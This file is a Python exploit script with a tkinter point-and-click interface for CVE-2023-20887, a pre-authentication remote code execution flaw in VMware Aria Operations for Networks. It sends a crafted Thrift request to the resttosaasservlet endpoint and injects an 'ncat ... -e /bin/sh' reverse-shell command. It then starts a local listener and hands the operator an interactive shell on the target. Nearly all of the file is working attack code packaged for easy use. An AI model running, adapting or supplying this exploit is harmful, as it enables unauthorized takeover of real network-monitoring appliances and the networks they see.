"""
VMWare Aria Operations for Networks (vRealize Network Insight) pre-authenticated RCE
Version: 6.8.0.1666364233
Exploit By: Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)
A root cause analysis of the vulnerability can be found on my blog:
https://summoning.team/blog/vmware-vrealize-network-insight-rce-cve-2023-20887/
"""
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import requests
from threading import Thread
import argparse
from telnetlib import Telnet
import socket
requests.packages.urllib3.disable_warnings()
import tkinter
from tkinter import *
import tkinter as tk
from tkinter.ttk import *
from time import strftime
from tkinter import ttk
def Networks():
    root = tkinter.Tk()
    root.title("CVE-2023-20887 exploits")
    root.geometry('800x600+0+0')
    def printInput():
        inp = inputtxt.get(1.0, "end-1c")
        lbl.config(text = "attack url : "+inp)
        host = inp
        scroll_y = Scrollbar(root, orient=VERTICAL)
        txtarea = Text(root, yscrollcommand=scroll_y.set, font=("times new roman", 15, "bold"), fg="#3206b8")
        scroll_y.pack(side=RIGHT, fill=Y)
        scroll_y.config(command=txtarea.yview)
        attacker = "192.168.1.10:1337"
        def handler():
            txtarea.insert(END, "(*) Starting handler")
            #print("(*) Starting handler")
            t = Telnet()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((attacker.split(":")[0],int(attacker.split(":")[1])))
            s.listen(1)
            conn, addr= s.accept()
            txtarea.insert(END, f"(+) Received connection from {addr[0]}")
           # print(f"(+) Received connection from {addr[0]}")
            t.sock = conn
            txtarea.insert(END, "(+) pop thy shell! (it's ready)")
           # print("(+) pop thy shell! (it's ready)")
            t.interact()

        def start_handler():
            t = Thread(target=handler)
            t.daemon = True
            t.start()


        def exploit():
            url = host + "/saas./resttosaasservlet"
            revshell = f'ncat {attacker.split(":")[0]} {attacker.split(":")[1]} -e /bin/sh'
            payload = """[1,"createSupportBundle",1,0,{"1":{"str":"1111"},"2":{"str":"`"""+revshell+"""`"},"3":{"str":"value3"},"4":{"lst":["str",2,"AAAA","BBBB"]}}]"""
            result = requests.post(url, headers={"Content-Type":"application/x-thrift"}, verify=False, data=payload)
        txtarea.insert(END, "VMWare Aria Operations for Networks (vRealize Network Insight) pre-authenticated RCE || Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)")
        #print("VMWare Aria Operations for Networks (vRealize Network Insight) pre-authenticated RCE || Sina Kheirkhah (@SinSinology) of Summoning Team (@SummoningTeam)")
        txtarea.pack(fill=BOTH, expand=True)
        txtarea.configure(state ='disabled')
        start_handler()
        exploit()

        try:
            while True:
                pass
        except KeyboardInterrupt:
           # print("(*) Exiting...")
            txtarea.insert(END, "(*) Exiting...")
    Hacher = Label(root, text="Enter url or domin https://www.example.com : ").pack()
    inputtxt = tk.Text(root,height = 1,width = 80)
    inputtxt.pack()
    printButton = tk.Button(root,text = "exploit", command = printInput)
    printButton.pack()
    lbl = tk.Label(root, text = "")
    lbl.pack()
    root.mainloop()
            #exit(0)
